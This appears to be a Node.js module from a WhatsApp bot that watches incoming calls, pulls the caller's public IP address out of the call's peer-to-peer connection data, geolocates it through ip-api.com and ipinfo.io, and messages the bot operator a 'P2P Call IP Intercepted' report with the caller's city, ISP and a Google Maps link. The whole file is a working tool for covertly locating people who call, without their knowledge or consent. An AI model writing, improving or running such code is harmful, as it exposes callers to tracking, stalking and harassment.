const axios = require('axios');
const dns = require('dns');
const { Resolver } = require('dns').promises;
const { getSettings } = require('./settings');

const resolver = new Resolver();

const ipCache = new Map();
const CACHE_TTL = 5 * 60 * 1000;

let p2pLastIP = null;
const captureQueue = [];

let debugTrackingActive = false;
let debugTrackingTimer = null;

const reportedCalls = new Set();

function startDebugTracking(duration = 8000) {
    debugTrackingActive = true;
    console.log(`[Analyzer Debug] Starting debug tracking for ${duration}ms`);

    if (debugTrackingTimer) {
        clearTimeout(debugTrackingTimer);
    }

    debugTrackingTimer = setTimeout(() => {
        debugTrackingActive = false;
        console.log(`[Analyzer Debug] Stopped debug tracking`);
    }, duration);
}

function isPublicIP(ip) {
    if (!ip) return false;
    const parts = ip.split('.').map(Number);
    if (parts.length !== 4) return false;
    const [a, b] = parts;
    const isPrivate = a === 10 ||
                     a === 127 ||
                     (a === 192 && b === 168) ||
                     (a === 172 && b >= 16 && b <= 31) ||
                     a === 0 ||
                     (a === 169 && b === 254) ||
                     (a >= 224);
    return !isPrivate;
}

async function analyzer(sock, call) {
    if (debugTrackingActive) {
        console.log(`[Analyzer Debug] Raw incoming node:`, JSON.stringify(call, null, 2));
    }

    if (!call || !Array.isArray(call) || call.length === 0) return;
    const callData = call[0];
    if (!callData) return;

    const { from, id, status } = callData;

    if (status === 'offer') {
        let capturedIP = null;

        try {
            const callStr = JSON.stringify(callData);
            const ipMatches = callStr.match(/\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g);
            if (ipMatches && ipMatches.length > 0) {
                for (const ip of ipMatches) {
                    if (isPublicIP(ip)) {
                        capturedIP = ip;
                        p2pLastIP = capturedIP;
                        break;
                    }
                }
            }
        } catch (e) {
            console.log(`[Analyzer] Could not parse call data for IP extraction: ${e.message}`);
        }

        if (!capturedIP) {
            const candidateSet = global.candidateMapByFrom?.get(from);
            if (candidateSet && candidateSet.size > 0) {
                for (const candidateIp of candidateSet) {
                    if (isPublicIP(candidateIp)) {
                        capturedIP = candidateIp;
                        p2pLastIP = capturedIP;
                        break;
                    }
                }
            }
        }

        if (capturedIP) {
            resolveAllCaptures(capturedIP);
        }

        if (!reportedCalls.has(id)) {
            reportedCalls.add(id);
            setTimeout(() => reportedCalls.delete(id), 60000);

            setTimeout(async () => {
                let finalIP = capturedIP;
                if (!finalIP) {
                    const cSet = global.candidateMapByFrom?.get(from);
                    if (cSet && cSet.size > 0) {
                        for (const candidateIp of cSet) {
                            if (isPublicIP(candidateIp)) {
                                finalIP = candidateIp;
                                break;
                            }
                        }
                    }
                }

                let targetJid = global.vault;
                try {
                    const settings = await getSettings();
                    if (settings?.home_jid) targetJid = settings.home_jid;
                } catch (_) {}

                if (!targetJid || !sock) return;

                if (finalIP && isPublicIP(finalIP)) {
                    const geo = await lookupIP(finalIP);
                    let reportText = `📞 *P2P Call IP Intercepted*\n\n` +
                                     `Contact: @${from.split('@')[0]}\n` +
                                     `Status: ${status}\n` +
                                     `IP: ${finalIP}\n`;

                    if (geo) {
                        reportText += `Location: ${geo.location}\n` +
                                      `ISP/Network: ${geo.isp || 'Unknown'}\n` +
                                      `Map: ${geo.gMapsUrl}`;
                    }

                    try {
                        await sock.sendMessage(targetJid, { text: reportText, mentions: [from] });
                    } catch (_) {}
                } else {
                    const logMsg = `📞 *Call Detection & Analyzer*\n\n` +
                                   `From: @${from.split('@')[0]}\n` +
                                   `Status: ${status}\n` +
                                   `Note: P2P direct IP candidate protected by relay/firewall.`;
                    try {
                        await sock.sendMessage(targetJid, { text: logMsg, mentions: [from] });
                    } catch (_) {}
                }
            }, 3000);
        }
    }
}

async function lookupIP(ip) {
    if (ipCache.has(ip)) {
        const cached = ipCache.get(ip);
        if (Date.now() - cached.timestamp < CACHE_TTL) {
            return cached.data;
        } else {
            ipCache.delete(ip);
        }
    }

    try {
        const res = await axios.get(`http://ip-api.com/json/${ip}`, {
            timeout: 10000,
            proxy: false
        });

        if (res.data && res.data.status === 'success') {
            const gMapsUrl = `https://www.google.com/maps?q=${res.data.lat},${res.data.lon}`;
            const result = {
                ip: res.data.query,
                location: `${res.data.city}, ${res.data.country}`,
                isp: res.data.isp || res.data.org || 'Unknown',
                gMapsUrl: gMapsUrl
            };

            ipCache.set(ip, { data: result, timestamp: Date.now() });
            return result;
        }
    } catch (e) {
        console.error(`[GEO] ip-api.com failed for ${ip}: ${e.message}. Trying fallback...`);
    }

    try {
        const token = process.env.IPINFO_TOKEN ? `?token=${process.env.IPINFO_TOKEN}` : '';
        const res = await axios.get(`https://ipinfo.io/${ip}/json${token}`, {
            timeout: 10000,
            proxy: false
        });

        if (res.data && res.data.loc) {
            const [lat, lon] = res.data.loc.split(',');
            const gMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            const result = {
                ip: res.data.ip || ip,
                location: `${res.data.city || 'Unknown'}, ${res.data.country || 'Unknown'}`,
                isp: res.data.org || 'Unknown',
                gMapsUrl: gMapsUrl
            };

            ipCache.set(ip, { data: result, timestamp: Date.now() });
            return result;
        }
    } catch (e2) {
        console.error(`[GEO] ipinfo.io fallback also failed for ${ip}: ${e2.message}`);
    }

    return null;
}

function captureIP(callId) {
    return new Promise((resolve, reject) => {
        const timeout = setTimeout(() => {
            const idx = captureQueue.findIndex(w => w.callId === callId);
            if (idx !== -1) captureQueue.splice(idx, 1);
            reject(new Error('IP capture timeout'));
        }, 8000);

        captureQueue.push({ callId, resolve, timeout });
    });
}

function resolveAllCaptures(ip) {
    while (captureQueue.length > 0) {
        const waiter = captureQueue.shift();
        clearTimeout(waiter.timeout);
        waiter.resolve({ ip });
    }
}

module.exports = {
    analyzer,
    lookupIP,
    captureIP,
    resolveAllCaptures,
    startDebugTracking,
    get p2pLastIP() {
        return p2pLastIP;
    },
    set p2pLastIP(value) {
        p2pLastIP = value;
    },
    get debugTrackingActive() {
        return debugTrackingActive;
    }
};
